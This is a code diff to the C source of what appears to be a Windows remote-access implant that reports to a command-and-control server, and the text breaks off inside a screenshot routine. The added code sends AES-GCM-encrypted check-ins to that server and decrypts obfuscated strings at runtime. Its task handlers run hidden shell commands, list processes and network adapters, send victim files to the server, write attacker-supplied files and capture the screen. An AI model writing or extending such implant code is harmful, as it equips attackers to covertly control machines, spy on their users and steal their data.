@@ -20,14 +20,20 @@
 #include "msgpack.h"
 #include "strings.h"
 #include "evasion.h"
+#include "injection.h"
 #include <winhttp.h>
 #include <bcrypt.h>
 #include <wincrypt.h>
+#include <tlhelp32.h>
+#include <iphlpapi.h>
+#include <shlobj.h>
 #include <stdio.h>
 #include <time.h>
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "gdi32.lib")
 #pragma comment(lib, "crypt32.lib")
 
 #ifndef NT_SUCCESS
@@ -573,7 +579,7 @@ BOOL TransportRegister(PSESSION pSession) {
 
     // 7. Build envelope
     BYTE bEnvelope[4096] = { 0 };
-    BYTE bEmptyKeyID[SESSION_KEYID_SIZE] = { 0 }; // Registration uses empty KeyID
+    BYTE bEmptyKeyID[SESSION_KEYID_SIZE] = { 0 };
     DWORD dwEnvLen = BuildEnvelope(PHANTOM_PROTOCOL_VERSION, MSG_REGISTER_REQUEST,
                                     bEmptyKeyID, pEncrypted, dwEncryptedLen, bEnvelope);
     HeapFree(GetProcessHeap(), 0, pEncrypted);
@@ -595,7 +601,6 @@ BOOL TransportRegister(PSESSION pSession) {
     // 10. Parse response: JSON → base64 → envelope → AES-GCM decrypt → msgpack
     if (!pResponse || dwResponseLen == 0) return FALSE;
 
-    // Extract base64 "data" field from JSON: {"data":"...", "ts":...}
     CHAR szMarker[16]; memcpy(szMarker, g_EncDataMarker, ENC_DATA_MARKER_LEN + 1);
     DecryptString(szMarker, ENC_DATA_MARKER_LEN);
     PCHAR pDataStart = strstr((PCHAR)pResponse, szMarker);
@@ -607,15 +612,12 @@ BOOL TransportRegister(PSESSION pSession) {
     if (!pDataEnd) { HeapFree(GetProcessHeap(), 0, pResponse); return FALSE; }
 
     DWORD dwB64Len = (DWORD)(pDataEnd - pDataStart);
-
-    // Base64 decode → envelope bytes
     BYTE bEnvBuf[4096] = { 0 };
     DWORD dwRespEnvLen = Base64Decode(pDataStart, dwB64Len, bEnvBuf, sizeof(bEnvBuf));
     HeapFree(GetProcessHeap(), 0, pResponse);
 
     if (dwRespEnvLen < 14) return FALSE;
 
-    // Parse envelope: [Ver:1][Type:1][KeyID:8][PayloadLen:4][Payload]
     BYTE bRespType = bEnvBuf[1];
     if (bRespType != MSG_REGISTER_RESPONSE) return FALSE;
 
@@ -623,149 +625,225 @@ BOOL TransportRegister(PSESSION pSession) {
     if (14 + dwPayloadLen > dwRespEnvLen) return FALSE;
 
     PBYTE pEncPayload2 = bEnvBuf + 14;
-
-    // AES-GCM decrypt with our session key
     PBYTE pDecrypted = NULL;
     DWORD dwDecryptedLen = 0;
     if (!AesGcmDecrypt(pSession->bSessionKey, pEncPayload2, dwPayloadLen, &pDecrypted, &dwDecryptedLen))
         return FALSE;
 
-    // Parse msgpack RegisterResponse
     INT nSleep = 10, nJitter = 20;
     CHAR szName[64] = { 0 };
     BOOL bParsed = MsgpackParseRegisterResponse(pDecrypted, dwDecryptedLen,
         pSession->szAgentID, sizeof(pSession->szAgentID),
         szName, sizeof(szName), &nSleep, &nJitter);
-
     HeapFree(GetProcessHeap(), 0, pDecrypted);
 
     if (bParsed) {
         strncpy(pSession->szAgentName, szName, sizeof(pSession->szAgentName) - 1);
         pSession->dwSleepMs = (DWORD)(nSleep * 1000);
         pSession->dwJitterPct = (DWORD)nJitter;
-        pSession->bRegistered = TRUE;
     } else {
-        // Fallback: registration succeeded but response parse failed
         strcpy(pSession->szAgentID, "unknown");
         pSession->dwSleepMs = g_Config.dwSleepMs;
         pSession->dwJitterPct = g_Config.dwJitterPct;
-        pSession->bRegistered = TRUE;
     }
-
+    pSession->bRegistered = TRUE;
     return TRUE;
 }
 
 // =============================================
 // TransportCheckIn - Send results, receive tasks
+// All buffers heap-allocated to support large output (screenshots etc.)
 // =============================================
 BOOL TransportCheckIn(PSESSION pSession, PC2_RESULT pResults, DWORD dwResultCount,
                       PC2_TASK* ppTasks, DWORD* pdwTaskCount) {
 
-    // 1. Build check-in msgpack (simplified: just agent_id + empty results)
-    BYTE bPayload[4096] = { 0 };
-    DWORD offset = 0;
-
-    // fixmap with 2 keys
-    bPayload[offset++] = 0x82;
-
-    // "agent_id" → session agent_id (decrypted at runtime)
-    CHAR szAidKey[16]; memcpy(szAidKey, g_EncAgentId, ENC_AGENT_ID_LEN + 1);
-    DecryptString(szAidKey, ENC_AGENT_ID_LEN);
-    DWORD klen = ENC_AGENT_ID_LEN;
-    bPayload[offset++] = 0xA0 | klen;
-    memcpy(bPayload + offset, szAidKey, klen); offset += klen;
-    ZeroString(szAidKey, ENC_AGENT_ID_LEN);
-    DWORD vlen = (DWORD)strlen(pSession->szAgentID);
-    if (vlen <= 31) {
-        bPayload[offset++] = 0xA0 | (vlen & 0x1F);
-    } else {
-        bPayload[offset++] = 0xD9;
-        bPayload[offset++] = (BYTE)vlen;
+    // 1. Calculate payload size: base + per-result overhead + output data
+    DWORD dwPayloadSize = 256; // base (agent_id key/val + map header + results key)
+    for (DWORD i = 0; i < dwResultCount; i++) {
+        dwPayloadSize += 256; // per-result overhead (keys + uuid strings + map headers)
+        if (pResults[i].pOutput && pResults[i].dwOutputLen > 0)
+            dwPayloadSize += pResults[i].dwOutputLen;
     }
-    memcpy(bPayload + offset, pSession->szAgentID, vlen); offset += vlen;
+    dwPayloadSize += 64; // safety
 
-    // "results" → empty array (decrypted at runtime)
-    CHAR szResKey[16]; memcpy(szResKey, g_EncResults, ENC_RESULTS_LEN + 1);
-    DecryptString(szResKey, ENC_RESULTS_LEN);
-    klen = ENC_RESULTS_LEN;
-    bPayload[offset++] = 0xA0 | klen;
-    memcpy(bPayload + offset, szResKey, klen); offset += klen;
-    ZeroString(szResKey, ENC_RESULTS_LEN);
-    bPayload[offset++] = 0x90; // empty fixarray
+    PBYTE pPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwPayloadSize);
+    if (!pPayload) return FALSE;
+
+    DWORD offset = 0;
+    DWORD aidLen = (DWORD)strlen(pSession->szAgentID);
+
+    // fixmap with 2 keys: agent_id + results
+    pPayload[offset++] = 0x82;
+
+    // key: "agent_id" (8 chars → fixstr)
+    pPayload[offset++] = 0xA8;
+    memcpy(pPayload + offset, "agent_id", 8); offset += 8;
+    // val: agent_id string (36 chars → str8)
+    pPayload[offset++] = 0xD9;
+    pPayload[offset++] = (BYTE)aidLen;
+    memcpy(pPayload + offset, pSession->szAgentID, aidLen); offset += aidLen;
+
+    // key: "results" (7 chars → fixstr)
+    pPayload[offset++] = 0xA7;
+    memcpy(pPayload + offset, "results", 7); offset += 7;
+
+    // val: fixarray of results
+    DWORD n = (dwResultCount > 15) ? 15 : dwResultCount;
+    pPayload[offset++] = 0x90 | (BYTE)n;
+
+    for (DWORD i = 0; i < n; i++) {
+        PC2_RESULT res = &pResults[i];
+        BOOL bHasOut = (res->pOutput && res->dwOutputLen > 0);
+        BOOL bHasErr = (res->szError[0] != '\0');
+        BYTE fields = 2 + (bHasOut ? 1 : 0) + (bHasErr ? 1 : 0);
+
+        pPayload[offset++] = 0x80 | fields;
+
+        // task_id
+        pPayload[offset++] = 0xA7;
+        memcpy(pPayload + offset, "task_id", 7); offset += 7;
+        DWORD tidLen = (DWORD)strlen(res->szTaskID);
+        pPayload[offset++] = 0xD9; pPayload[offset++] = (BYTE)tidLen;
+        memcpy(pPayload + offset, res->szTaskID, tidLen); offset += tidLen;
+
+        // agent_id
+        pPayload[offset++] = 0xA8;
+        memcpy(pPayload + offset, "agent_id", 8); offset += 8;
+        pPayload[offset++] = 0xD9; pPayload[offset++] = (BYTE)aidLen;
+        memcpy(pPayload + offset, pSession->szAgentID, aidLen); offset += aidLen;
+
+        // output (binary)
+        if (bHasOut) {
+            pPayload[offset++] = 0xA6;
+            memcpy(pPayload + offset, "output", 6); offset += 6;
+            DWORD outLen = res->dwOutputLen;
+            if (outLen > 65535) outLen = 65535;
+            if (outLen <= 255) {
+                pPayload[offset++] = 0xC4; pPayload[offset++] = (BYTE)outLen;
+            } else {
+                pPayload[offset++] = 0xC5;
+                pPayload[offset++] = (BYTE)(outLen >> 8);
+                pPayload[offset++] = (BYTE)(outLen & 0xFF);
+            }
+            memcpy(pPayload + offset, res->pOutput, outLen); offset += outLen;
+        }
+
+        // error (string)
+        if (bHasErr) {
+            pPayload[offset++] = 0xA5;
+            memcpy(pPayload + offset, "error", 5); offset += 5;
+            DWORD errLen = (DWORD)strlen(res->szError);
+            if (errLen <= 31) {
+                pPayload[offset++] = 0xA0 | (BYTE)errLen;
+            } else {
+                pPayload[offset++] = 0xD9; pPayload[offset++] = (BYTE)errLen;
+            }
+            memcpy(pPayload + offset, res->szError, errLen); offset += errLen;
+        }
+    }
 
     // 2. AES-GCM encrypt
     PBYTE pEncPayload = NULL;
     DWORD dwEncLen = 0;
-    if (!AesGcmEncrypt(pSession->bSessionKey, bPayload, offset, &pEncPayload, &dwEncLen))
+    if (!AesGcmEncrypt(pSession->bSessionKey, pPayload, offset, &pEncPayload, &dwEncLen)) {
+        HeapFree(GetProcessHeap(), 0, pPayload);
         return FALSE;
+    }
+    HeapFree(GetProcessHeap(), 0, pPayload);
 
-    // 3. Build envelope
-    BYTE bEnvelope[8192] = { 0 };
+    // 3. Build envelope (heap)
+    DWORD dwEnvSize = 14 + dwEncLen + 4;
+    PBYTE pEnvelope = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEnvSize);
+    if (!pEnvelope) { HeapFree(GetProcessHeap(), 0, pEncPayload); return FALSE; }
     DWORD dwEnvLen = BuildEnvelope(PHANTOM_PROTOCOL_VERSION, MSG_CHECKIN,
-                                    pSession->bKeyID, pEncPayload, dwEncLen, bEnvelope);
+                                    pSession->bKeyID, pEncPayload, dwEncLen, pEnvelope);
     HeapFree(GetProcessHeap(), 0, pEncPayload);
 
-    // 4. Wrap in JSON
-    CHAR szJson[16384] = { 0 };
-    DWORD dwJsonLen = WrapForHTTP(bEnvelope, dwEnvLen, szJson, sizeof(szJson));
-    if (dwJsonLen == 0) return FALSE;
+    // 4. Base64 encode (heap)
+    DWORD dwB64Size = (dwEnvLen * 4 / 3) + 8;
+    PCHAR pBase64 = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwB64Size);
+    if (!pBase64) { HeapFree(GetProcessHeap(), 0, pEnvelope); return FALSE; }
+    Base64Encode(pEnvelope, dwEnvLen, pBase64, dwB64Size);
+    HeapFree(GetProcessHeap(), 0, pEnvelope);
 
-    // 5. POST to /api/v1/status (decrypted at runtime)
+    // 5. Wrap in JSON (heap)
+    DWORD dwJsonSize = (DWORD)strlen(pBase64) + 64;
+    PCHAR pJson = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwJsonSize);
+    if (!pJson) { HeapFree(GetProcessHeap(), 0, pBase64); return FALSE; }
+    sprintf_s(pJson, dwJsonSize, "{\"data\":\"%s\",\"ts\":%lld}", pBase64, (long long)time(NULL));
+    HeapFree(GetProcessHeap(), 0, pBase64);
+
+    // 6. POST to /api/v1/status
     PBYTE pResponse = NULL;
     DWORD dwResponseLen = 0;
     CHAR szChkURI[32]; memcpy(szChkURI, g_EncCheckInURI, ENC_CHECKIN_URI_LEN + 1);
     DecryptString(szChkURI, ENC_CHECKIN_URI_LEN);
-    BOOL bChkOk = HttpPost(szChkURI, (PBYTE)szJson, dwJsonLen, &pResponse, &dwResponseLen);
+    BOOL bChkOk = HttpPost(szChkURI, (PBYTE)pJson, (DWORD)strlen(pJson), &pResponse, &dwResponseLen);
     ZeroString(szChkURI, ENC_CHECKIN_URI_LEN);
+    HeapFree(GetProcessHeap(), 0, pJson);
     if (!bChkOk) return FALSE;
 
-    // 6. Parse tasks from response: JSON → base64 → envelope → AES-GCM decrypt → msgpack
+    // 7. Parse tasks from response
     if (!pResponse || dwResponseLen == 0) {
-        *ppTasks = NULL;
-        *pdwTaskCount = 0;
-        return TRUE; // No response is OK (server may have no tasks)
-    }
-
-    PCHAR pDataStart2 = strstr((PCHAR)pResponse, "\"data\":\"");
-    if (!pDataStart2) { HeapFree(GetProcessHeap(), 0, pResponse); *ppTasks = NULL; *pdwTaskCount = 0; return TRUE; }
-    pDataStart2 += 8;
-
-    PCHAR pDataEnd2 = strchr(pDataStart2, '"');
-    if (!pDataEnd2) { HeapFree(GetProcessHeap(), 0, pResponse); *ppTasks = NULL; *pdwTaskCount = 0; return TRUE; }
-
-    DWORD dwB64Len2 = (DWORD)(pDataEnd2 - pDataStart2);
-    BYTE bEnvBuf2[8192] = { 0 };
-    DWORD dwEnvLen2 = Base64Decode(pDataStart2, dwB64Len2, bEnvBuf2, sizeof(bEnvBuf2));
-    HeapFree(GetProcessHeap(), 0, pResponse);
-
-    if (dwEnvLen2 < 14) { *ppTasks = NULL; *pdwTaskCount = 0; return TRUE; }
-
-    // Parse envelope
-    DWORD dwPayloadLen2 = (bEnvBuf2[10] << 24) | (bEnvBuf2[11] << 16) | (bEnvBuf2[12] << 8) | bEnvBuf2[13];
-    if (14 + dwPayloadLen2 > dwEnvLen2) { *ppTasks = NULL; *pdwTaskCount = 0; return TRUE; }
-
-    // AES-GCM decrypt
-    PBYTE pDecrypted2 = NULL;
-    DWORD dwDecryptedLen2 = 0;
-    if (!AesGcmDecrypt(pSession->bSessionKey, bEnvBuf2 + 14, dwPayloadLen2, &pDecrypted2, &dwDecryptedLen2)) {
-        *ppTasks = NULL;
-        *pdwTaskCount = 0;
+        if (ppTasks) *ppTasks = NULL;
+        if (pdwTaskCount) *pdwTaskCount = 0;
         return TRUE;
     }
 
-    // Parse msgpack CheckInResponse → tasks array
-    C2_TASK taskBuf[16] = { 0 }; // Max 16 tasks per check-in
+    PCHAR pDataStart2 = strstr((PCHAR)pResponse, "\"data\":\"");
+    if (!pDataStart2) {
+        HeapFree(GetProcessHeap(), 0, pResponse);
+        if (ppTasks) *ppTasks = NULL; if (pdwTaskCount) *pdwTaskCount = 0;
+        return TRUE;
+    }
+    pDataStart2 += 8;
+    PCHAR pDataEnd2 = strchr(pDataStart2, '"');
+    if (!pDataEnd2) {
+        HeapFree(GetProcessHeap(), 0, pResponse);
+        if (ppTasks) *ppTasks = NULL; if (pdwTaskCount) *pdwTaskCount = 0;
+        return TRUE;
+    }
+
+    DWORD dwB64Len2 = (DWORD)(pDataEnd2 - pDataStart2);
+    DWORD dwEnvBufSize = 8192;
+    PBYTE pEnvBuf2 = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwEnvBufSize);
+    if (!pEnvBuf2) { HeapFree(GetProcessHeap(), 0, pResponse); return FALSE; }
+    DWORD dwEnvLen2 = Base64Decode(pDataStart2, dwB64Len2, pEnvBuf2, dwEnvBufSize);
+    HeapFree(GetProcessHeap(), 0, pResponse);
+
+    if (dwEnvLen2 < 14) {
+        HeapFree(GetProcessHeap(), 0, pEnvBuf2);
+        if (ppTasks) *ppTasks = NULL; if (pdwTaskCount) *pdwTaskCount = 0;
+        return TRUE;
+    }
+
+    DWORD dwPayloadLen2 = (pEnvBuf2[10] << 24) | (pEnvBuf2[11] << 16) | (pEnvBuf2[12] << 8) | pEnvBuf2[13];
+    if (14 + dwPayloadLen2 > dwEnvLen2) {
+        HeapFree(GetProcessHeap(), 0, pEnvBuf2);
+        if (ppTasks) *ppTasks = NULL; if (pdwTaskCount) *pdwTaskCount = 0;
+        return TRUE;
+    }
+
+    PBYTE pDecrypted2 = NULL; DWORD dwDecryptedLen2 = 0;
+    if (!AesGcmDecrypt(pSession->bSessionKey, pEnvBuf2 + 14, dwPayloadLen2, &pDecrypted2, &dwDecryptedLen2)) {
+        HeapFree(GetProcessHeap(), 0, pEnvBuf2);
+        if (ppTasks) *ppTasks = NULL; if (pdwTaskCount) *pdwTaskCount = 0;
+        return TRUE;
+    }
+    HeapFree(GetProcessHeap(), 0, pEnvBuf2);
+
+    C2_TASK taskBuf[16] = { 0 };
     DWORD dwParsedTasks = 0;
     MsgpackParseCheckInResponse(pDecrypted2, dwDecryptedLen2, taskBuf, 16, &dwParsedTasks);
     HeapFree(GetProcessHeap(), 0, pDecrypted2);
 
-    if (dwParsedTasks > 0) {
+    if (dwParsedTasks > 0 && ppTasks) {
         *ppTasks = (PC2_TASK)HeapAlloc(GetProcessHeap(), 0, sizeof(C2_TASK) * dwParsedTasks);
-        memcpy(*ppTasks, taskBuf, sizeof(C2_TASK) * dwParsedTasks);
-    } else {
+        if (*ppTasks) memcpy(*ppTasks, taskBuf, sizeof(C2_TASK) * dwParsedTasks);
+    } else if (ppTasks) {
         *ppTasks = NULL;
     }
-    *pdwTaskCount = dwParsedTasks;
+    if (pdwTaskCount) *pdwTaskCount = dwParsedTasks;
 
     return TRUE;
 }
@@ -800,48 +878,49 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
 
     SESSION session = { 0 };
 
-    // Initialize transport
-    if (!TransportInit(pConfig))
-        return;
+    if (!TransportInit(pConfig)) return;
 
-    // Register with C2
     if (!TransportRegister(&session)) {
         TransportCleanup();
         return;
     }
 
-    // Main loop: check in → get tasks → execute → report results
+    // Results carried between iterations: execute this cycle, send next cycle
+    C2_RESULT results[16] = { 0 };
+    DWORD dwResultCount = 0;
+
+    // Main loop: check in (with pending results) → get tasks → execute → sleep → repeat
     while (TRUE) {
 
         // Check kill date
         if (pConfig->szKillDate[0] != '\0') {
-            // Simple date check — compare YYYYMMDD
-            SYSTEMTIME st;
-            GetSystemTime(&st);
+            SYSTEMTIME st; GetSystemTime(&st);
             CHAR szNow[16];
             sprintf(szNow, "%04d-%02d-%02d", st.wYear, st.wMonth, st.wDay);
-            if (strcmp(szNow, pConfig->szKillDate) > 0) {
-                break; // Kill date passed, exit
-            }
+            if (strcmp(szNow, pConfig->szKillDate) > 0) break;
         }
 
-        // Check in
         PC2_TASK pTasks = NULL;
         DWORD dwTaskCount = 0;
-        if (TransportCheckIn(&session, NULL, 0, &pTasks, &dwTaskCount)) {
+        if (TransportCheckIn(&session, results, dwResultCount, &pTasks, &dwTaskCount)) {
 
-            // Execute tasks and collect results
-            C2_RESULT results[16] = { 0 };
-            DWORD dwResultCount = 0;
+            // Free previous result output buffers now that we've sent them
+            for (DWORD j = 0; j < dwResultCount; j++) {
+                if (results[j].pOutput && results[j].dwOutputLen > 0)
+                    HeapFree(GetProcessHeap(), 0, results[j].pOutput);
+            }
+            memset(results, 0, sizeof(results));
+            dwResultCount = 0;
 
+            // Execute new tasks, collect results for next check-in
             for (DWORD i = 0; i < dwTaskCount && i < 16; i++) {
                 C2_RESULT* res = &results[dwResultCount];
                 strcpy(res->szTaskID, pTasks[i].szTaskID);
                 strcpy(res->szAgentID, session.szAgentID);
 
                 switch (pTasks[i].bType) {
+                    // ── SHELL ────────────────────────────────────────
                     case TASK_SHELL: {
-                        // Execute shell command (cmd prefix decrypted at runtime)
                         if (pTasks[i].dwArgCount > 0) {
                             CHAR szPrefix[16]; memcpy(szPrefix, g_EncCmdExe, ENC_CMD_EXE_LEN + 1);
                             DecryptString(szPrefix, ENC_CMD_EXE_LEN);
@@ -849,7 +928,6 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                             sprintf(szCmd, "%s%s", szPrefix, pTasks[i].szArgs[0]);
                             ZeroString(szPrefix, ENC_CMD_EXE_LEN);
 
-                            // Create pipe for output capture
                             HANDLE hReadPipe, hWritePipe;
                             SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
                             if (CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
@@ -857,21 +935,26 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                                     .dwFlags = STARTF_USESTDHANDLES,
                                     .hStdOutput = hWritePipe, .hStdError = hWritePipe };
                                 PROCESS_INFORMATION pi = { 0 };
-
                                 if (CreateProcessA(NULL, szCmd, NULL, NULL, TRUE,
                                     CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                                     CloseHandle(hWritePipe);
                                     WaitForSingleObject(pi.hProcess, 30000);
 
-                                    // Read output
-                                    BYTE outBuf[4096] = { 0 };
-                                    DWORD dwRead = 0;
-                                    ReadFile(hReadPipe, outBuf, sizeof(outBuf) - 1, &dwRead, NULL);
-
-                                    res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwRead + 1);
-                                    memcpy(res->pOutput, outBuf, dwRead);
-                                    res->dwOutputLen = dwRead;
-
+                                    // Dynamic read loop — handles large output
+                                    DWORD dwCapacity = 65536, dwTotal = 0, dwRead = 0;
+                                    PBYTE pOut = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwCapacity);
+                                    while (pOut && ReadFile(hReadPipe, pOut + dwTotal,
+                                            dwCapacity - dwTotal - 1, &dwRead, NULL) && dwRead > 0) {
+                                        dwTotal += dwRead;
+                                        if (dwTotal + 4096 >= dwCapacity) {
+                                            dwCapacity *= 2;
+                                            PBYTE pNew = (PBYTE)HeapReAlloc(GetProcessHeap(), 0, pOut, dwCapacity);
+                                            if (!pNew) break;
+                                            pOut = pNew;
+                                        }
+                                    }
+                                    res->pOutput = pOut;
+                                    res->dwOutputLen = dwTotal;
                                     CloseHandle(pi.hProcess);
                                     CloseHandle(pi.hThread);
                                 } else {
@@ -884,24 +967,351 @@ VOID ImplantMain(PIMPLANT_CONFIG pConfig) {
                         dwResultCount++;
                         break;
                     }
+
+                    // ── CD ───────────────────────────────────────────
+                    case TASK_CD: {
+                        if (pTasks[i].dwArgCount > 0) {
+                            if (SetCurrentDirectoryA(pTasks[i].szArgs[0])) {
+                                CHAR szCwd[MAX_PATH] = {0};
+                                GetCurrentDirectoryA(MAX_PATH, szCwd);
+                                DWORD len = (DWORD)strlen(szCwd);
+                                res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, len + 1);
+                                memcpy(res->pOutput, szCwd, len);
+                                res->dwOutputLen = len;
+                            } else {
+                                sprintf(res->szError, "cd: cannot access '%s' (err %lu)",
+                                    pTasks[i].szArgs[0], GetLastError());
+                            }
+                        } else {
+                            strcpy(res->szError, "cd: path required");
+                        }
+                        dwResultCount++;
+                        break;
+                    }
+
+                    // ── PROCESS LIST ─────────────────────────────────
+                    case TASK_PROCESSLIST: {
+                        DWORD dwCap = 65536, dwOff = 0;
+                        PBYTE pOut = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwCap);
+                        if (pOut) {
+                            dwOff += sprintf((CHAR*)pOut + dwOff,
+                                "%-40s %6s %6s %6s\n", "NAME", "PID", "PPID", "THREADS");
+                            dwOff += sprintf((CHAR*)pOut + dwOff,
+                                "%-40s %6s %6s %6s\n",
+                                "----------------------------------------", "------", "------", "-------");
+                            PROCESSENTRY32W pe = { .dwSize = sizeof(PROCESSENTRY32W) };
+                            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+                            if (hSnap != INVALID_HANDLE_VALUE) {
+                                if (Process32FirstW(hSnap, &pe)) {
+                                    do {
+                                        CHAR szName[256] = {0};
+                                        WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1,
+                                            szName, sizeof(szName), NULL, NULL);
+                                        if (dwOff + 128 < dwCap)
+                                            dwOff += sprintf((CHAR*)pOut + dwOff,
+                                                "%-40s %6lu %6lu %6lu\n",
+                                                szName, pe.th32ProcessID,
+                                                pe.th32ParentProcessID, pe.cntThreads);
+                                    } while (Process32NextW(hSnap, &pe));
+                                }
+                                CloseHandle(hSnap);
+                            }
+                            res->pOutput = pOut;
+                            res->dwOutputLen = dwOff;
+                        }
+                        dwResultCount++;
+                        break;
+                    }
+
+                    // ── IFCONFIG ─────────────────────────────────────
+                    case TASK_IFCONFIG: {
+                        ULONG dwBufLen = sizeof(IP_ADAPTER_INFO);
+                        PIP_ADAPTER_INFO pInfo = (PIP_ADAPTER_INFO)HeapAlloc(
+                            GetProcessHeap(), 0, dwBufLen);
+                        if (pInfo && GetAdaptersInfo(pInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
+                            HeapFree(GetProcessHeap(), 0, pInfo);
+                            pInfo = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), 0, dwBufLen);
+                        }
+                        DWORD dwCap = 65536, dwOff = 0;
+                        PBYTE pOut = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwCap);
+                        if (pInfo && pOut && GetAdaptersInfo(pInfo, &dwBufLen) == NO_ERROR) {
+                            for (PIP_ADAPTER_INFO p = pInfo; p; p = p->Next) {
+                                dwOff += sprintf((CHAR*)pOut + dwOff,
+                                    "\n[%s] — %s\n", p->AdapterName, p->Description);
+                                dwOff += sprintf((CHAR*)pOut + dwOff, "  MAC: ");
+                                for (UINT m = 0; m < p->AddressLength; m++)
+                                    dwOff += sprintf((CHAR*)pOut + dwOff,
+                                        m ? ":%02X" : "%02X", (BYTE)p->Address[m]);
+                                dwOff += sprintf((CHAR*)pOut + dwOff, "\n");
+                                for (PIP_ADDR_STRING ip = &p->IpAddressList; ip; ip = ip->Next)
+                                    if (ip->IpAddress.String[0] != '0')
+                                        dwOff += sprintf((CHAR*)pOut + dwOff,
+                                            "  IP:  %s  Mask: %s\n",
+                                            ip->IpAddress.String, ip->IpMask.String);
+                                if (p->GatewayList.IpAddress.String[0] != '0')
+                                    dwOff += sprintf((CHAR*)pOut + dwOff,
+                                        "  GW:  %s\n", p->GatewayList.IpAddress.String);
+                            }
+                        }
+                        if (pInfo) HeapFree(GetProcessHeap(), 0, pInfo);
+                        res->pOutput = pOut;
+                        res->dwOutputLen = dwOff;
+                        dwResultCount++;
+                        break;
+                    }
+
+                    // ── DOWNLOAD (read file → C2) ─────────────────────
+                    case TASK_DOWNLOAD: {
+                        if (pTasks[i].dwArgCount > 0) {
+                            HANDLE hFile = CreateFileA(pTasks[i].szArgs[0], GENERIC_READ,
+                                FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+                            if (hFile != INVALID_HANDLE_VALUE) {
+                                DWORD dwSize = GetFileSize(hFile, NULL);
+                                PBYTE pBuf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwSize + 1);
+                                DWORD dwRead = 0;
+                                if (pBuf && ReadFile(hFile, pBuf, dwSize, &dwRead, NULL)) {
+                                    res->pOutput = pBuf;
+                                    res->dwOutputLen = dwRead;
+                                } else {
+                                    sprintf(res->szError, "download: read failed (err %lu)", GetLastError());
+                                    if (pBuf) HeapFree(GetProcessHeap(), 0, pBuf);
+                                }
+                                CloseHandle(hFile);
+                            } else {
+                                sprintf(res->szError, "download: cannot open '%s' (err %lu)",
+                                    pTasks[i].szArgs[0], GetLastError());
+                            }
+                        } else {
+                            strcpy(res->szError, "download: remote path required");
+                        }
+                        dwResultCount++;
+                        break;
+                    }
+
+                    // ── UPLOAD (C2 → write file) ──────────────────────
+                    case TASK_UPLOAD: {
+                        if (pTasks[i].dwArgCount > 0 && pTasks[i].pData && pTasks[i].dwDataLen > 0) {
+                            HANDLE hFile = CreateFileA(pTasks[i].szArgs[0], GENERIC_WRITE, 0,
+                                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+                            if (hFile != INVALID_HANDLE_VALUE) {
+                                DWORD dwWritten = 0;
+                                WriteFile(hFile, pTasks[i].pData, pTasks[i].dwDataLen, &dwWritten, NULL);
+                                CloseHandle(hFile);
+                                CHAR szMsg[256];
+                                sprintf(szMsg, "[+] Wrote %lu bytes to %s", dwWritten, pTasks[i].szArgs[0]);
+                                DWORD mlen = (DWORD)strlen(szMsg);
+                                res->pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, mlen + 1);
+                                memcpy(res->pOutput, szMsg, mlen);
+                                res->dwOutputLen = mlen;
+                            } else {
+                                sprintf(res->szError, "upload: cannot create '%s' (err %lu)",
+                                    pTasks[i].szArgs[0], GetLastError());
+                            }
+                        } else {
+                            strcpy(res->szError, "upload: path and data required");
+                        }
+                        dwResultCount++;
+                        break;
+                    }
+
+                    // ── SCREENSHOT (GDI → BMP in memory) ─────────────
+                    case TASK_SCREENSHOT: {
+                        HDC hScreen = GetDC(NULL);
+                        HDC hDC     = CreateCompatibleDC(hScreen);
+                        int cx = GetSystemMetrics(SM_CXSCREEN);
+                        int cy = GetSystemMetrics(SM_CYSCREEN);
+                        HBITMAP hBmp = CreateCompatibleBitmap(hScreen, cx, cy);
+                        SelectObject(hDC, hBmp);
+                        BitBlt(hDC, 0, 0, cx, cy, hScreen, 0, 0, SRCCOPY);
+
+                        BITMAPINFOHEADER bmih = {0};
+                        bmih.biSize        = sizeof(BITMAPINFOHEADER);
+                        bmih.biWidth       = cx;
+                        bmih.biHeight      = -cy;   // top-down
+                        bmih.biPlanes      = 1;
+                        bmih.biBitCount    = 24;
+                        bmih.biCompression = BI_RGB;
+                        DWORD dwRowBytes   = ((cx * 3 + 3) & ~3);
+                        DWORD dwPixelBytes = dwRowBytes * cy;
+                        DWORD dwFileSize   = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPixelBytes;
+
+                        PBYTE pBmp = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
+                        if (pBmp) {
+                            BITMAPFILEHEADER bmfh = {0};
+                            bmfh.bfType      = 0x4D42; // "BM"
+                            bmfh.bfSize      = dwFileSize;
+                            bmfh.bfOffBits   = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+                            memcpy(pBmp, &bmfh, sizeof(bmfh));
+                            memcpy(pBmp + sizeof(bmfh), &bmih, sizeof(bmih));
